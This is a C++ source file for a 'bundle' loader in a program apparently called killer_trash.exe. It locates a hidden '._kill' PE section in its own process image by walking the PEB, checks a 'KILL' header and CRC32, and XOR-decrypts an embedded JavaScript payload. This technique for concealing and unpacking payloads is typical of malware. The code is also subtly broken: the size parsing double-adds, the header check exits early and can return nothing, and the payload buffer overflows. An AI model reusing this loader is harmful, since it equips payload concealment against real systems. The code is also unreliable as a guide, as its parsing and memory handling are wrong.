
#include "bundle.h"
#include "../utils/crypto_crc32.h"

void bundle::setBundleSize(uint32_t size) {
    this->bundleSize = size;
}

void bundle::setBundleAddress(uint8_t* address) {
    this->bundleAddress = address;
}

DWORD bundle::getBundleSize() const {
    return this->bundleSize;
}

bundle::bundle(uint8_t* address, DWORD size) {
    this->bundleAddress = address;
    this->bundleSize = size;
}

uint8_t *bundle::getPayloadAddress() {
    return this->bundleAddress;
}

std::unique_ptr<bundle> bundle::findBundle() {
    PPEB pPEB = (PPEB) __readgsqword(0x60);
    MY_LDR_DATA_TABLE_ENTRY *ldrDataTableEntry =
            CONTAINING_RECORD(pPEB->Ldr->InMemoryOrderModuleList.Flink,
                              MY_LDR_DATA_TABLE_ENTRY,
                              InMemoryOrderLinks);
    PIMAGE_DOS_HEADER dosHeader = nullptr;

    // TODO: Update string handling to c++ wstring if possible and
    // use a better string compare to find ourselves.
    wchar_t *processName = ldrDataTableEntry->BaseDllName.Buffer;
    USHORT processNameLength = ldrDataTableEntry->BaseDllName.Length;

    if (_wcsnicmp(L"killer_trash.exe", processName, processNameLength) == 0) {
        // This is the start of us in memory, at the PE magic header
        dosHeader = (PIMAGE_DOS_HEADER) ldrDataTableEntry->DllBase;
    }

    uint8_t *processBase = (uint8_t *)dosHeader;
    PIMAGE_NT_HEADERS64 ntHeader64 = (PIMAGE_NT_HEADERS64)(processBase + dosHeader->e_lfanew);
    PIMAGE_FILE_HEADER fileHeader = &ntHeader64->FileHeader;
    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeader64);

    // TODO: This can potentially be improved (search), hard-coded target
    bool found = false;
    for (int i = 0; i < fileHeader->NumberOfSections; i++) {
        std::cout << "[+] Searching for bundle section." << std::endl;
        if (strcmp(reinterpret_cast<const char *>(sectionHeader->Name), "._kill") == 0) {
            // Found our target section
            std::cout << "[+] Found bundle section: " << sectionHeader->Name << std::endl;
            found = true;
            break;
        }
        std::cout << "[-] " << sectionHeader->Name << std::endl;
        sectionHeader++;
    }

    if (!found) {
        std::cerr << "[!] Target section not found!" << std::endl;
        return nullptr;
    }

    DWORD virtualAddress = sectionHeader->VirtualAddress;
    DWORD virtualSize = sectionHeader->Misc.VirtualSize;

    std::cout << "[+] Base Address: 0x" << std::hex << std::noshowbase << std::setw(16) << std::setfill('0') << &processBase << std::endl;
    std::cout << "[+] Virtual address: 0x" << std:: hex << std::noshowbase << std::setw(16) << std::setfill('0') << virtualAddress << std::endl;
    std::cout << "[+] Bundle Size: " << virtualSize << std::endl;
    auto sectionAddress = (processBase + virtualAddress);

    std::unique_ptr<bundle> bundleInstance = std::make_unique<bundle>(sectionAddress, virtualSize);

    return bundleInstance;
}

bool bundle::extractPayload(std::unique_ptr<bundle> &blob) {

    std::vector<uint8_t> blobVector;
    std::vector<uint8_t> magicHeaderVector {0x4B, 0x49, 0x4C, 0x4C};
    uint32_t payloadSize;
    uint32_t crc32;

    // Read entire bundle blob into a vector
    uint32_t size = blob->getBundleSize();
    for (int i = 0; i < size; i++) {
        blobVector.push_back(*(blob->getPayloadAddress() + i));
    }

    bool valid_header = bundle::verifyHeader(blobVector, magicHeaderVector);
    if (!valid_header) {
        std::cerr << "[!] Could not find magic header - unknown format." << std::endl;
    } else {
        std::cout << "[+] Found valid magic header!" << std::endl;
    }

    payloadSize = bundle::extractPayloadSize(blobVector);
    crc32 = bundle::extractPayloadCRC32(blobVector);

    // Extract js payload
    std::string js = extractJS(blobVector, magicHeaderVector, payloadSize);

    // Check js payload crc32

    auto *jsCRC32 = new crypto_crc32();
    DWORD crcValue;
    jsCRC32->init();
    jsCRC32->stringCRC32(js.c_str(), crcValue);

    if (crcValue == crc32) {
        return true;
    }

    return false;
}

bool bundle::verifyHeader(const std::vector<uint8_t> &blob, const std::vector<uint8_t> &header) {
    // Verify that our bundle blob contains the expected magic header
    for (int i = 0; i <= blob.size() - header.size(); i++) {
        bool match = true;
        for (int j = 0; j < header.size(); j++) {
            if (blob[i + j] != header[j]) {
                match = false;
                break;
            }
        }
        if (match) {
            return true;
        } else {
            return false;
        }
    }
}

uint32_t bundle::extractPayloadSize(const std::vector<uint8_t> &blob) {

    uint32_t size = blob[4];
    size = size << 8;
    size += blob[5];
    size = size << 8;
    size += blob[6];
    size = size << 8;
    size += size + blob[7];
    std::cout << "[+] Payload Size: " << size << std::endl;
    return size;
}

uint32_t bundle::extractPayloadCRC32(const std::vector<uint8_t> &blob) {
    uint32_t crc32 = blob[8];
    crc32 = crc32 << 8;
    crc32 += blob[9];
    crc32 = crc32 << 8;
    crc32 += blob[10];
    crc32 = crc32 << 8;
    crc32 += blob[11];
    std::cout << "[+] Payload CRC32: " << crc32 << std::endl;
    return crc32;
}

std::string bundle::extractJS(const std::vector<uint8_t> &blob, const std::vector<uint8_t> &key, uint32_t size) {
    auto iter = std::next(blob.begin(), 12);
    auto *js_payload = new uint8_t[size];
    int index = 0;
    for (iter; iter < blob.end(); iter++) {
        auto item = *iter;
        js_payload[index] = *iter;
        index++;
    }

    // Decrypt bundle
    std::cout << "[+] Decrypting bundle." << std::endl;
    for (int i = 0; i < size + 1; i++) {
        if (i == size) {
            js_payload[i] = '\0';
            break;
        }
        js_payload[i] ^= key[i % 4];
    }
    std::cout << "[+] Payload decrypted: " << js_payload << std::endl;
    return std::string{reinterpret_cast<char*>(js_payload)};
}

